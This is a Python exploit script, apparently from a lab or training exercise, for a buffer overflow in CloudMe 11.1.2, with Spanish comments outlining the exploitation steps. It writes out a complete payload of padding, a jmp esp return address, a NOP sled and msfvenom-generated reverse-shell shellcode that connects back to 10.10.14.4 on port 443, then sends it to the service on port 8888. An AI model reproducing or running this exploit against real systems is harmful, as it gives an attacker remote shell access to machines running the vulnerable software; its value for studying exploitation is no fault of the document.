#!/usr/bin/python3 

#Buffer Overflow CloudMe 11.1.2 (https://cloudme.com/downloads/CloudMe_1112.exe)

import socket

'''
PASOS 
1. Detectar si hay BOF
2. Offset hasta llegar al eip
3. Mirar badchars 
4. Poner en eip un direccion que posteriormente haga un salto a esp (mona mira @ que haga un jmp esp)
5. NOops
6. cargar un shellcode malicioso
'''

#Variables globales 

ip_address='127.0.0.1'
junk = b"A"*1052
eip = b"\x7b\x8a\xa9\x68" #68a98a7b (@ donde se encuentra un jmp esp. jmp esp OPcode = FFE4)
nops = b"\x90"*90
#Alternativa a NOPS --> sub_esp = b"\x83\xEC\x10" #83EC10 sub esp, 0x10

#msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.4 LPORT=443 --platform windows -a x86 -b "\x00" -f python -v shellcode
shellcode =  b""
shellcode += b"\xd9\xe1\xd9\x74\x24\xf4\xbd\x15\xee\x13\xb7"
shellcode += b"\x5b\x29\xc9\xb1\x52\x31\x6b\x17\x03\x6b\x17"
shellcode += b"\x83\xd6\xea\xf1\x42\x24\x1a\x77\xac\xd4\xdb"
shellcode += b"\x18\x24\x31\xea\x18\x52\x32\x5d\xa9\x10\x16"
shellcode += b"\x52\x42\x74\x82\xe1\x26\x51\xa5\x42\x8c\x87"
shellcode += b"\x88\x53\xbd\xf4\x8b\xd7\xbc\x28\x6b\xe9\x0e"
shellcode += b"\x3d\x6a\x2e\x72\xcc\x3e\xe7\xf8\x63\xae\x8c"
shellcode += b"\xb5\xbf\x45\xde\x58\xb8\xba\x97\x5b\xe9\x6d"
shellcode += b"\xa3\x05\x29\x8c\x60\x3e\x60\x96\x65\x7b\x3a"
shellcode += b"\x2d\x5d\xf7\xbd\xe7\xaf\xf8\x12\xc6\x1f\x0b"
shellcode += b"\x6a\x0f\xa7\xf4\x19\x79\xdb\x89\x19\xbe\xa1"
shellcode += b"\x55\xaf\x24\x01\x1d\x17\x80\xb3\xf2\xce\x43"
shellcode += b"\xbf\xbf\x85\x0b\xdc\x3e\x49\x20\xd8\xcb\x6c"
shellcode += b"\xe6\x68\x8f\x4a\x22\x30\x4b\xf2\x73\x9c\x3a"
shellcode += b"\x0b\x63\x7f\xe2\xa9\xe8\x92\xf7\xc3\xb3\xfa"
shellcode += b"\x34\xee\x4b\xfb\x52\x79\x38\xc9\xfd\xd1\xd6"
shellcode += b"\x61\x75\xfc\x21\x85\xac\xb8\xbd\x78\x4f\xb9"
shellcode += b"\x94\xbe\x1b\xe9\x8e\x17\x24\x62\x4e\x97\xf1"
shellcode += b"\x25\x1e\x37\xaa\x85\xce\xf7\x1a\x6e\x04\xf8"
shellcode += b"\x45\x8e\x27\xd2\xed\x25\xd2\xb5\x1b\xb0\xd2"
shellcode += b"\x41\x74\xc6\xea\x48\x3f\x4f\x0c\x20\x2f\x06"
shellcode += b"\x87\xdd\xd6\x03\x53\x7f\x16\x9e\x1e\xbf\x9c"
shellcode += b"\x2d\xdf\x0e\x55\x5b\xf3\xe7\x95\x16\xa9\xae"
shellcode += b"\xaa\x8c\xc5\x2d\x38\x4b\x15\x3b\x21\xc4\x42"
shellcode += b"\x6c\x97\x1d\x06\x80\x8e\xb7\x34\x59\x56\xff"
shellcode += b"\xfc\x86\xab\xfe\xfd\x4b\x97\x24\xed\x95\x18"
shellcode += b"\x61\x59\x4a\x4f\x3f\x37\x2c\x39\xf1\xe1\xe6"
shellcode += b"\x96\x5b\x65\x7e\xd5\x5b\xf3\x7f\x30\x2a\x1b"
shellcode += b"\x31\xed\x6b\x24\xfe\x79\x7c\x5d\xe2\x19\x83"
shellcode += b"\xb4\xa6\x2a\xce\x94\x8f\xa2\x97\x4d\x92\xae"
shellcode += b"\x27\xb8\xd1\xd6\xab\x48\xaa\x2c\xb3\x39\xaf"
shellcode += b"\x69\x73\xd2\xdd\xe2\x16\xd4\x72\x02\x33"

payload = junk + eip + nops + shellcode

def makeConnection():
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((ip_address,8888))

    s.send(payload)

if __name__ == '__main__':
    makeConnection()
